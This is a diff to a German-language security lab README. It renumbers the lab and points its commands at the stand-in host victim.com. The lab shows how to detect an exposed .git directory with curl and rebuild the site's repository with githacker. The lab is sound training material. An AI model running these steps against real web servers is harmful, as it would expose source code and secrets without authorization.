@@ -1,6 +1,6 @@
-# 00 Git Hacking mit `.git` Ordner
+# 01 Git Hacking mit `.git` Ordner
 
-- [00 Git Hacking mit `.git` Ordner](#00-git-hacking-mit-git-ordner)
+- [01 Git Hacking mit `.git` Ordner](#01-git-hacking-mit-git-ordner)
   - [Durchführung](#durchführung)
     - [1. Zugriff auf die Beispiel-Webseite](#1-zugriff-auf-die-beispiel-webseite)
     - [2. Zugriff auf das Config-Verzeichnis testen](#2-zugriff-auf-das-config-verzeichnis-testen)
@@ -26,7 +26,7 @@ Die folgenden Schritte gehen davon aus, dass du dich in der Laborumgebung befind
 ### 1. Zugriff auf die Beispiel-Webseite
 
 ```bash
-curl http://localhost:8000
+curl http://victim.com:8000
 ```
 
 Die Startseite wird angezeigt und informiert dich, dass Dateien im `config`-Verzeichnis nicht zugänglich sind.
@@ -34,7 +34,7 @@ Die Startseite wird angezeigt und informiert dich, dass Dateien im `config`-Verz
 ### 2. Zugriff auf das Config-Verzeichnis testen
 
 ```bash
-curl http://localhost:8000/config
+curl http://victim.com:8000/config
 ```
 
 Der Zugriff wird verweigert – der Webserver blockiert das Verzeichnis wie erwartet.
@@ -42,7 +42,7 @@ Der Zugriff wird verweigert – der Webserver blockiert das Verzeichnis wie erwa
 ### 3. Zugriff auf das `.git`-Verzeichnis prüfen
 
 ```bash
-curl http://localhost:8000/.git/config
+curl http://victim.com:8000/.git/config
 ```
 
 Die Ausgabe zeigt die Git-Konfiguration – das `.git`-Verzeichnis ist zugänglich!
@@ -50,7 +50,7 @@ Die Ausgabe zeigt die Git-Konfiguration – das `.git`-Verzeichnis ist zugängli
 ### 4. Repository mit Githacker rekonstruieren
 
 ```bash
-githacker --url http://localhost:8000 --output-folder git-hack
+githacker --url http://victim.com:8000 --output-folder git-hack
 ```
 
 Das Tool lädt alle relevanten Dateien aus dem `.git`-Verzeichnis und stellt das Repository im Ordner `git-hack` wieder her.
@@ -128,22 +128,22 @@ git clone https://github.com/V0idC0de/security-by-design.git
 ### 2. Baue den Container
 
 > [!WARNING]
-> Stell sicher, dass du dich im Verzeichnis `labs/00-git-hacking` im Repository befindest,
+> Stell sicher, dass du dich im Verzeichnis `labs/01-git-hacking` im Repository befindest,
 > bevor du `docker build` ausführst! Für alle anderen `docker`-Befehle ist das Verzeichnis egal.
 
 ```bash
 # Überspringe dieses Kommando, falls du schon in diesem Unterordner bist
-cd security-by-design/labs/00-git-hacking
+cd security-by-design/labs/01-git-hacking
 ```
 
 ```bash
-docker build -t labs/00-git-hacking .
+docker build -t labs/01-git-hacking .
 ```
 
 ### 3. Starten des Containers
 
 ```bash
-docker run -it --name git-hacking --hostname git-hacking labs/00-git-hacking
+docker run -it --name git-hacking --hostname git-hacking labs/01-git-hacking
 ```
 
 > [!NOTE]
